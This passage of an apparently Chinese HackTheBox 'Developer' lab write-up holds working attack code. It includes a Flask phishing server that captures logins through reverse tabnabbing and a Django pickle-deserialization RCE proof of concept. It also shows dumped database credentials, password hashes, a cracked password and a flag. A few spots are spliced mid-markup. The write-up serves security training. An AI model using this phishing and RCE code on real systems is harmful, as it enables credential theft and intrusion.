-\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是我们还不知道要如何进行利用\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eSessionid\u003c/code\u003e开启了\u003ccode\u003ehttponly\u003c/code\u003e ，我们无法通过\u003ccode\u003eXSS\u003c/code\u003e获取\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e通过目录扫描能发现，还存在一个登录框，并且是只能\u003ccode\u003eadmin\u003c/code\u003e才能访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是现在没什么用，回到后台，我发现当我们提交了\u003ccode\u003ewriteup\u003c/code\u003e后，会在\u003ccode\u003eprofile\u003c/code\u003e中生成一个链接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e重要的是这个链接具有\u003ccode\u003etarget\u003c/code\u003e属性，其值为\u003ccode\u003e_blank\u003c/code\u003e,同时没有使用\u003ccode\u003erel=\"noopener\"\u003c/code\u003e属性，这让我想起\u003ccode\u003eReverse_Tabnabbing\u003c/code\u003e （标签页劫持攻击）漏洞，之前有在\u003ccode\u003eVulnhub\u003c/code\u003e上的一台靶机（\u003ca href=\"https://www.vulnhub.com/entry/napping-101,752/%EF%BC%89%E9%81%87%E5%88%B0%E8%BF%87\"\u003ehttps://www.vulnhub.com/entry/napping-101,752/）遇到过\u003c/a\u003e\u003c/p\u003e\n\u003ch3\u003eReverse_Tabnabbing\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-community/attacks/Reverse_Tabnabbing\"\u003ehttps://owasp.org/www-community/attacks/Reverse_Tabnabbing\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e监听一下对方请求\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer nc -lvp 80    \nlistening on [any] 80 ...\nconnect to [10.10.16.58] from developer.htb [10.10.11.103] 47222\nGET / HTTP/1.1\nHost: 10.10.16.58\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 21 Jun 2025 11:08:45 GMT\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e回显中有\u003ccode\u003efirefox\u003c/code\u003e的\u003ccode\u003eUA\u003c/code\u003e，很大概率使用浏览器来访问的\u003c/p\u003e\n\u003cp\u003e现在的思路是：提交跳转链接，然后伪造一个和\u003ccode\u003edeveloper.htb\u003c/code\u003e 的登录页面一样站点，对方点击后，弹到\u003ccode\u003ewriteup\u003c/code\u003e页面，然后原始页面（\u003ccode\u003edashbroad\u003c/code\u003e）变成我们的钓鱼网站，让对方以为登录掉了，然后我们获取凭证\u003c/p\u003e\n\u003cp\u003e这里借用：\u003ca href=\"https://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data\"\u003ehttps://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data\u003c/a\u003e 的方法，我自己弄了好久没弄好\u003c/p\u003e\n\u003cp\u003e搭建钓鱼服务器\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e server2.py  \nfrom flask import *\n\napp = Flask(__name__, template_folder=\u003cspan class=\"hljs-string\"\u003e'.'\u003c/span\u003e)\n\n@app.route(\u003cspan class=\"hljs-string\"\u003e\"/writeup\"\u003c/span\u003e)\ndef writeup():\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e render_template(\u003cspan class=\"hljs-string\"\u003e'writeup.html'\u003c/span\u003e)\n\n@app.route(\u003cspan class=\"hljs-string\"\u003e\"/accounts/login/\"\u003c/span\u003e, methods=[\u003cspan class=\"hljs-string\"\u003e'GET'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e])\ndef login():\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e request.method == \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'\\n'\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e([f\u003cspan class=\"hljs-string\"\u003e'{x[0]}: {x[1]}'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e x \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e request.form.items()]))\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e redirect(\u003cspan class=\"hljs-string\"\u003e\"http://10.10.10.120/accounts/login/\"\u003c/span\u003e, code=302)\n    \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e render_template(\u003cspan class=\"hljs-string\"\u003e'login.html'\u003c/span\u003e)\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e __name__ == \u003cspan class=\"hljs-string\"\u003e\"__main__\"\u003c/span\u003e:\n    app.run(host=\u003cspan class=\"hljs-string\"\u003e\"0.0.0.0\"\u003c/span\u003e, port=80)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e跳转网站\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;html\u003e\n  \u0026#x3C;body\u003e\n    \u0026#x3C;h2\u003eChallenge Writeup\u0026#x3C;/h2\u003e\n    \u0026#x3C;p\u003eSomething\u0026#x3C;/p\u003e\n    \u0026#x3C;script\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (window.opener) window.opener.parent.location.replace(\u003cspan class=\"hljs-string\"\u003e'http://10.10.16.58/accounts/login/'\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (window.parent != window) window.parent.location.replace(\u003cspan class=\"hljs-string\"\u003e'https://10.10.16.58/accounts/login/'\u003c/span\u003e);           \n    \u0026#x3C;/script\u003e\n  \u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e制造钓鱼站点\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer curl http://developer.htb/accounts/login/ \u003e login.html                                                \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1938  100  1938    0     0  13686      0 --:--:-- --:--:-- --:--:-- 13744\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e修改里面的静态内容为绝对路径并将\u003ccode\u003eaction\u003c/code\u003e 改为\u003ccode\u003e/accounts/login/\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;!doctype html\u003e\n\u0026#x3C;html lang=\u003cspan class=\"hl e\u003eForgot password?\u0026#x3C;/a\u003e\n                \u0026#x3C;div class=\u003cspan class=\"hljs-string\"\u003e\"text-center mt-4 font-weight-light\"\u003c/span\u003e\u003e Don\u003cspan class=\"hljs-string\"\u003e't have an account? \u0026#x3C;a href=\"http://developer.htb/saccounts/signup/\" \u003eClick here!\u0026#x3C;/a\u003e\n      \u0026#x3C;p class=\"mt-5 mb-3 text-muted\"\u003e\u0026#x26;copy; Developer.HTB 2021\u0026#x3C;/p\u003e\n    \u0026#x3C;/form\u003e\n\n\u0026#x3C;script src=\"http://developer.htb/static/js/jquery.toast.js\"\u003e\u0026#x3C;/script\u003e\n\u0026#x3C;script\u003e\n\n\u0026#x3C;/script\u003e\n  \u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e开启钓鱼服务器，并提交\u003ccode\u003e/writeup\u003c/code\u003e到站点中，过一会就能接收到用户的密码了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer python server2.py\n * Serving Flask app \u003cspan class=\"hljs-string\"\u003e'server2'\u003c/span\u003e\n * Debug mode: off\nWARNING: This is a development server. Do not use it \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:80\n * Running on http://192.168.111.155:80\nPress CTRL+C to quit\n10.10.11.103 - - [21/Jun/2025 20:49:24] \u003cspan class=\"hljs-string\"\u003e\"GET /writeup HTTP/1.1\"\u003c/span\u003e 200 -\n10.10.11.103 - - [21/Jun/2025 20:49:24] \u003cspan class=\"hljs-string\"\u003e\"GET /accounts/login/ HTTP/1.1\"\u003c/span\u003e 200 -\ncsrfmiddlewaretoken: 3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE\nlogin: admin\npassword: SuperSecurePassword@HTB2021\n10.10.11.103 - - [21/Jun/2025 20:49:25] \u003cspan class=\"hljs-string\"\u003e\"POST /accounts/login/ HTTP/1.1\"\u003c/span\u003e 302 -\n10.10.11.103 - - [21/Jun/2025 20:49:28] \u003cspan class=\"hljs-string\"\u003e\"GET /accounts/login/ HTTP/1.1\"\u003c/span\u003e 200 -\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里很奇怪的就是，我自己复现该漏洞无法复现成功\u003c/p\u003e\n\u003ch2\u003eDjango Secret Key \u0026#x26; RCE\u003c/h2\u003e\n\u003cp\u003e拥有管理员凭据后，我们就能对 \u003ccode\u003e/admin\u003c/code\u003e进行登陆了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能发现一个新的子域名\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e搭建的是\u003ccode\u003esentry\u003c/code\u003e 一款开源的实时异常监控平台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注册账号登录进去，无法使用上面的凭据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e版本 \u003ccode\u003eSentry 8.0.0\u003c/code\u003e 在网上能找到它的反序列化漏洞的利用脚本，但是并没有将\u003ccode\u003eshell\u003c/code\u003e弹回来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里使用 \u003ccode\u003ejacob@developer.htb\u003c/code\u003e （可以从\u003ccode\u003eMember\u003c/code\u003e里得到）的凭据和上边钓鱼得到的密码成功获得\u003ccode\u003esentry\u003c/code\u003e更高权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后摸索一番后，我创建了新的\u003ccode\u003eproject\u003c/code\u003e然后删除，但是删除的时候出现了错误\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e还有很多的调试信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eSENTRY_OPTIONS \t\n\n{\u003cspan class=\"hljs-string\"\u003e'cache.backend'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'sentry.cache.redis.RedisCache'\u003c/span\u003e,\n \u003cspan class=\"hljs-string\"\u003e'cache.options'\u003c/span\u003e: {},\n \u003cspan class=\"hljs-string\"\u003e'redis.options'\u003c/span\u003e: {\u003cspan class=\"hljs-string\"\u003e'hosts'\u003c/span\u003e: {0: {\u003cspan class=\"hljs-string\"\u003e'host'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'127.0.0.1'\u003c/span\u003e,\n                                 \u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe'\u003c/span\u003e,\n                                 \u003cspan class=\"hljs-string\"\u003e'port'\u003c/span\u003e: 6379}}},\n \u003cspan class=\"hljs-string\"\u003e'system.databases'\u003c/span\u003e: {\u003cspan class=\"hljs-string\"\u003e'default'\u003c/span\u003e: {\u003cspan class=\"hljs-string\"\u003e'ATOMIC_REQUESTS'\u003c/span\u003e: False,\n                                  \u003cspan class=\"hljs-string\"\u003e'AUTOCOMMIT'\u003c/span\u003e: True,\n                                  \u003cspan class=\"hljs-string\"\u003e'CONN_MAX_AGE'\u003c/span\u003e: 0,\n                                  \u003cspan class=\"hljs-string\"\u003e'ENGINE'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'sentry.db.postgres'\u003c/span\u003e,\n                                  \u003cspan class=\"hljs-string\"\u003e'HOST'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'localhost'\u003c/span\u003e,\n                                  \u003cspan class=\"hljs-string\"\u003e'NAME'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'sentry'\u003c/span\u003e,\n                                  \u003cspan class=\"hljs-string\"\u003e'OPTIONS'\u003c/span\u003e: {},\n                                  \u003cspan class=\"hljs-string\"\u003e'PASSWORD'\u003c/span\u003e: u\u003cspan class=\"hljs-string\"\u003e'********************'\u003c/span\u003e,\n                                  \u003cspan class=\"hljs-string\"\u003e'PORT'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n                                  \u003cspan class=\"hljs-string\"\u003e'TEST_CHARSET'\u003c/span\u003e: None,\n                                  \u003cspan class=\"hljs-string\"\u003e'TEST_COLLATION'\u003c/span\u003e: None,\n                                  \u003cspan class=\"hljs-string\"\u003e'TEST_MIRROR'\u003c/span\u003e: None,\n                                  \u003cspan class=\"hljs-string\"\u003e'TEST_NAME'\u003c/span\u003e: None,\n                                  \u003cspan class=\"hljs-string\"\u003e'TIME_ZONE'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'UTC'\u003c/span\u003e,\n                                  \u003cspan class=\"hljs-string\"\u003e'USER'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'sentry'\u003c/span\u003e}},\n \u003cspan class=\"hljs-string\"\u003e'system.debug'\u003c/span\u003e: True,\n \u003cspan class=\"hljs-string\"\u003e'system.secret-key'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'c7f3a64aa184b7cbb1a7cbe9cd544913'\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到内部装了\u003ccode\u003eredis\u003c/code\u003e ，并且密码也出来了，下边还有个有趣的\u003ccode\u003esecret-key\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e经过一番搜索，\u003ccode\u003esecret-key\u003c/code\u003e 会导致反序列化的\u003ccode\u003eRCE\u003c/code\u003e漏洞\u003c/p\u003e\n\u003cp\u003e其中有一篇文章：\u003ca href=\"https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/\"\u003ehttps://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e里边有一个\u003ccode\u003ePOC\u003c/code\u003e ，会让系统睡\u003ccode\u003e30\u003c/code\u003e秒\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-meta\"\u003e#!/usr/bin/python\u003c/span\u003e\nimport django.core.signing, django.contrib.sessions.serializers\nfrom django.http import HttpResponse\nimport cPickle\nimport os\n\nSECRET_KEY=\u003cspan class=\"hljs-string\"\u003e'c7f3a64aa184b7cbb1a7cbe9cd544913'\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#Initial cookie I had on sentry when trying to reset a password\u003c/span\u003e\ncookie=\u003cspan class=\"hljs-string\"\u003e'.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQplR7lVRJYEmrkUFqZFcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQABCTQf:1uSyim:otT7eddw7eu0o_QNAt1QRz6f1m8'\u003c/span\u003e\nnewContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u003cspan class=\"hljs-string\"\u003e'django.contrib.sessions.backends.signed_cookies'\u003c/span\u003e)\nclass PickleRce(object):\n    def __reduce__(self):\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (os.system,(\u003cspan class=\"hljs-string\"\u003e\"sleep 30\"\u003c/span\u003e,))\nnewContent[\u003cspan class=\"hljs-string\"\u003e'testcookie'\u003c/span\u003e] = PickleRce()\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=\u003cspan class=\"hljs-string\"\u003e'django.contrib.sessions.backends.signed_cookies'\u003c/span\u003e,compress=True)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer python2 POC.py     \n.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABCmRHuVVElgSauRQWpkVwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUI5inNSUwsUjA0KmVsLWYIKWUOF4hNLSzLiS4tTi-KTEpOzU_NSQpUgduiVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegB0jjs_:1uT0GX:UtsjlwEnnkwtUuqifJt-ZzyYO1s\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e事实证明，替换了\u003ccode\u003eCookie\u003c/code\u003e后，确实加载了\u003ccode\u003e30\u003c/code\u003e秒\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们尝试让其\u003ccode\u003ecurl\u003c/code\u003e我们的服务器\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image24.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹\u003ccode\u003eShell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image25.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eIn www-data Shell\u003c/h2\u003e\n\u003cp\u003e信息收集一波\u003c/p\u003e\n\u003cp\u003e有两个用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@developer:/var/sentry$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e /home\n\u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e /home\nkarl\nmark\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e数据配置文件可以在\u003ccode\u003e/var/www/developer_ctf/developer_ctf/settings.py\u003c/code\u003e 中找到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eDATABASES = {                                            \n    \u003cspan class=\"hljs-string\"\u003e'default'\u003c/span\u003e: {           \n        \u003cspan class=\"hljs-string\"\u003e'ENGINE'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'django.db.backends.postgresql'\u003c/span\u003e,       \n        \u003cspan class=\"hljs-string\"\u003e'NAME'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'platform'\u003c/span\u003e,             \n        \u003cspan class=\"hljs-string\"\u003e'USER'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'ctf_admin'\u003c/span\u003e,  \n        \u003cspan class=\"hljs-string\"\u003e'PASSWORD'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'CTFOG2021'\u003c/span\u003e,                         \n        \u003cspan class=\"hljs-string\"\u003e'HOST'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'localhost'\u003c/span\u003e,   \n        \u003cspan class=\"hljs-string\"\u003e'PORT'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,    \n    }                                      \n}  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@developer:~/developer_ctf$ psql -U ctf_admin -h localhost -p 5432 -d platform\nPassword \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user ctf_admin: \npsql (9.6.22)\nSSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)\nType \u003cspan class=\"hljs-string\"\u003e\"help\"\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e.\n\nplatform=\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得用户似乎都无效\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e |                                         password                                         |          last_login           | is_superuser |                                                                        username                                                                        | first_name | last_name |          email           | is_staff | is_active |          date_joined          \n----+------------------------------------------------------------------------------------------+-------------------------------+--------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------+--------------------------+----------+-----------+-------------------------------\n  5 | pbkdf2_sha256$260000$FyKNWfAl4Z87o55I4bDST7\u003cspan class=\"hljs-variable\"\u003e$7PrVwU5N1687BSxClTP0tlnFg\u003c/span\u003e+9VmOR6lsXiJsSRBNE= | 2021-05-27 20:15:00.346686+00 | f            | clubby789 \u003e,                           \n        \u003cspan class=\"hljs-string\"\u003e'USER'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'sentry'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'PASSWORD'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'SentryPassword2021'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'HOST'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'localhost'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'PORT'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\n    }     \n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这次能获得三个用户，并且\u003ccode\u003ekarl\u003c/code\u003e是有家目录的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esentry=#   \n\u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e,username,password from auth_user;\n \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e |      username       |                                   password                                    \n----+---------------------+-------------------------------------------------------------------------------\n  1 | karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD\u003cspan class=\"hljs-variable\"\u003e$TTeyAB7uJ9uQprnr\u003c/span\u003e+mgRb8ZL8othIs32aGmqahx1rGI=\n  6 | sunset@qq.com       | pbkdf2_sha256$12000$0EZfh8zCtpXY\u003cspan class=\"hljs-variable\"\u003e$8aNutC5bwrU65AtpuvspwEicUw2\u003c/span\u003e+63EQ61zjTyzVViE=\n  5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD\u003cspan class=\"hljs-variable\"\u003e$MeYgWqZffc6tBixWGwXX2NTf\u003c/span\u003e/0jIG42ofI+W3vcUKts=\n(3 rows)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试破解密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image26.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到密码：\u003ccode\u003einsaneclownposse\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e成功进入\u003ccode\u003eKarl\u003c/code\u003e用户\u003ccode\u003eShell\u003c/code\u003e中，读取\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ekarl@developer:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\n77cc1a399155edc9a66dae47df32a834\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eIn Karl Shell - To Root\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003esudo\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ekarl@developer:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e karl: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e karl on developer:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser karl may run the following commands on developer:\n    (ALL : ALL) /root/.auth/authenticator\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拉出来\u003ccode\u003eIDA\u003c/code\u003e ，\u003ccode\u003erust\u003c/code\u003e 逆向\u003ccode\u003e+1\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image27.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003emain\u003c/code\u003e中还有个\u003ccode\u003eauthentication::main\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  isize v4; // rdx\n  core::ops::\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e::_Fn\u0026#x3C;()\u003e v5; // rdi\n  __int64 (__fastcall *v7)(); // [rsp+0h] [rbp-8h] BYREF\n\n  v4 = argc;\n  v7 = authentication::main::h453271f02403abaf;\n  v5.vtable = (usize (*)[3])\u0026#x26;anon_b091e66417960b0266d335ff382118b4_0_llvm_10046553308101135558;\n  v5.pointer = (u8 *)\u0026#x26;v7;\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e std::rt::lang_start_internal::h3c710f42dc1fbba8(v5, v4, (u8 **)argv);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进入到\u003ccode\u003eauthentication::main\u003c/code\u003e ，前边两个\u003ccode\u003eprint\u003c/code\u003e是打印前两条信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image28.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image29.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再下面就是加密的函数\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image30.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eargs.pieces.data_ptr = (_str *)crypto::aes::ctr::h2e946f13694abc7d(0LL, \u0026#x26;v36, 16LL, \u0026#x26;v37, 16LL);\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e告诉我们使用\u003ccode\u003eAES-CTR\u003c/code\u003e进行加密，并且传入了从内存地址冲传入的两个常量\u003ccode\u003ev36\u003c/code\u003e和\u003ccode\u003ev37\u003c/code\u003e ，很有可能是\u003ccode\u003ekey\u003c/code\u003e和\u003ccode\u003eVI\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们从\u003ccode\u003ev36\u003c/code\u003e 和 \u003ccode\u003ev37\u003c/code\u003e中将值复制出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image31.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e还因为是小端显示的问题，我们还要对其转换一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs 